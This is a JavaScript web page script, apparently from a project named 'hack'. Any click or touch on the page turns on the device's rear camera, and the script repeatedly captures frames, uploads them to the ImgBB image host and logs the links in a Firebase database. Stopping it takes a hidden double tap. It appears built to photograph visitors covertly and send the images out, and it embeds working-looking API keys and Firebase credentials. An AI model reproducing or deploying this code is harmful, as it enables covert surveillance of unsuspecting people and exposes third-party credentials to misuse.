// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDdbZumQNpD_crFlofVf2yzWUoaOZS0ZFM",
    authDomain: "hack-392ff.firebaseapp.com",
    projectId: "hack-392ff",
    databaseURL: "https://hack-392ff-default-rtdb.firebaseio.com",
    storageBucket: "hack-392ff.firebasestorage.app",
    messagingSenderId: "927440063077",
    appId: "1:927440063077:web:cb46698aa0c16d35d3148c",
    measurementId: "G-NGG3X7ZK61"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

let videoStream;
let frameCount = 0;
const FRAMES_BEFORE_CAPTURE = 50;

const statusText = document.getElementById('status');

// Add video element for live preview
const videoElement = document.createElement('video');
videoElement.style.width = '100%';
videoElement.style.maxWidth = '400px';
videoElement.setAttribute('playsinline', true); // Important for iOS
document.getElementById('app').appendChild(videoElement);

async function startCamera() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'environment',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            } 
        });
        
        videoElement.srcObject = videoStream;
        await videoElement.play();

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const ctx = canvas.getContext('2d');

        function captureFrame() {
            if (frameCount >= FRAMES_BEFORE_CAPTURE) {
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                uploadImage(imageData);
                frameCount = 0;
            } else {
                frameCount++;
            }
            if (videoStream) {
                requestAnimationFrame(captureFrame);
            }
        }

        captureFrame();
        statusText.textContent = 'Camera active. Capturing every 50 frames.';

    } catch (error) {
        console.error('Camera access error:', error);
        statusText.textContent = 'Camera access failed. Please try again.';
    }
}

function stopCamera() {
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
        frameCount = 0;
        statusText.textContent = 'Camera stopped.';
    }
}

function uploadImage(imageData) {
    const apiKey = '63843b305acfadfbd987e5570952fe17'; // Replace with your ImgBB API key
    const base64Image = imageData.split(',')[1];

    const formData = new FormData();
    formData.append('image', base64Image);

    fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(result => {
        console.log('Upload Response:', result);
        if(result.data && result.data.url) {
            saveToDatabase(result.data.url);
        }
    })
    .catch(error => {
        console.error('Upload failed:', error);
        statusText.textContent = 'Upload failed. Please try again.';
    });
}

function saveToDatabase(imageUrl) {
    const imagesRef = database.ref('images');
    imagesRef.push({
        url: imageUrl,
        timestamp: Date.now()
    }).then(() => {
        console.log('Image URL saved to database');
    }).catch(error => {
        console.error('Database save failed:', error);
    });
}

// Event listeners for starting camera
document.body.addEventListener('touchstart', startCamera);
document.body.addEventListener('click', startCamera);

// Double tap to stop camera
let lastTap = 0;
document.body.addEventListener('touchend', function(event) {
    const currentTime = new Date().getTime();
    const tapLength = currentTime - lastTap;
    if (tapLength < 500 && tapLength > 0) {
        stopCamera();
    }
    lastTap = currentTime;
});
